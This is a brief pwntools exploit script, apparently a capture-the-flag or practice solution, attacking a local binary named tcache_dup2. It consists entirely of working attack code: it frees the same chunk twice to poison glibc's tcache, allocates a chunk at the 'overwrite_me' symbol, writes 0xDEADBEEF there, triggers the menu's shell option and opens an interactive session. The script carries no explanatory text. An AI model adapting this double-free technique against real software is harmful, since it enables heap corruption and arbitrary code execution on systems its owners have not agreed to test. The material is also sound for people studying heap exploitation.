# tcache_dup2.py

from pwn import *
p = process("./tcache_dup2")

def add(data):
	print p.sendlineafter(">","1")
	print p.sendlineafter(":",str(data))
def free(idx):
	print p.sendlineafter(">","2")
	print p.sendlineafter(":",str(idx))
def getshell():
	print p.sendlineafter(">","3")
elf = ELF('./tcache_dup2')
overwrite_me = elf.symbols['overwrite_me']

print p.sendlineafter("Name :", "AAAA")
add("AAAA")
free(0)
free(0)  
add(p64(overwrite_me)) 
add("BBBB") 
add(p64(0xDEADBEEF)) 
getshell()
p.interactive()